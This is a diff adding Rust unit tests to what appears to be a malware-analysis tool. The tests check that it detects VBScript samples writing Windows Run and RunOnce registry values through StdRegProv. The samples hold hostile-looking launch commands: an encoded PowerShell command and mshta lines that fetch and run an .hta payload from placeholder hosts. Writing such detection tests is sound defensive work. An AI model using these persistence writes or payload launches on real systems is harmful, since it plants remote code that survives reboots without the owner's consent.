@@ -20566,6 +20566,93 @@ sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater", cmd, "
     }
 
     #[test]
+    fn standalone_vbs_stdregprov_setstringvalue_run_key_emits_persistence() {
+        let vbs = br#"Set reg = GetObject("winmgmts:\\.\root\default:StdRegProv")
+HKCU = &H80000001
+key = "Software\Microsoft\Windows\CurrentVersion\Run"
+name = "Updater"
+cmd = "powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAHMAdABkAHIAZQBnAA=="
+reg.SetStringValue HKCU, key, name, cmd"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    value_name,
+                    command,
+                } if hive == "HKCU"
+                    && key == r"Software\Microsoft\Windows\CurrentVersion\Run"
+                    && value_name == "Updater"
+                    && command == "powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAHMAdABkAHIAZQBnAA=="
+            )),
+            "no Run-key Persistence from VBS StdRegProv.SetStringValue: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.extracted_ps1.is_empty(),
+            "StdRegProv Run value should be routed through powershell"
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_stdregprov_setstringvalue_hklm_runonce_emits_persistence() {
+        let vbs = br#"Set reg = GetObject("winmgmts:\\.\root\default:StdRegProv")
+reg.SetStringValue &H80000002, "Software\Microsoft\Windows\CurrentVersion\RunOnce", "OneShot", "mshta https://stdregprov-runonce.example/payload.hta""#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    value_name,
+                    command,
+                } if hive == "HKLM"
+                    && key == r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
+                    && value_name == "OneShot"
+                    && command == "mshta https://stdregprov-runonce.example/payload.hta"
+            )),
+            "no HKLM RunOnce Persistence from VBS StdRegProv.SetStringValue: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://stdregprov-runonce.example/payload.hta"
+            )),
+            "StdRegProv RunOnce command should be scanned for URL launches: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_stdregprov_setstringvalue_non_run_key_is_not_persistence() {
+        let vbs = br#"Set reg = GetObject("winmgmts:\\.\root\default:StdRegProv")
+reg.SetStringValue &H80000001, "Software\Demo", "Value", "mshta https://stdregprov-nonrun.example/payload.hta""#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    command,
+                    ..
+                } if command == "mshta https://stdregprov-nonrun.example/payload.hta"
+            )),
+            "non-Run StdRegProv write should not emit Persistence: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn standalone_vbs_shortcut_creation_emits_shortcut_trait() {
         let vbs = br#"Set shell = CreateObject("WScript.Shell")
 Set link = shell.CreateShortcut("C:\Users\Public\Desktop\demo.lnk")
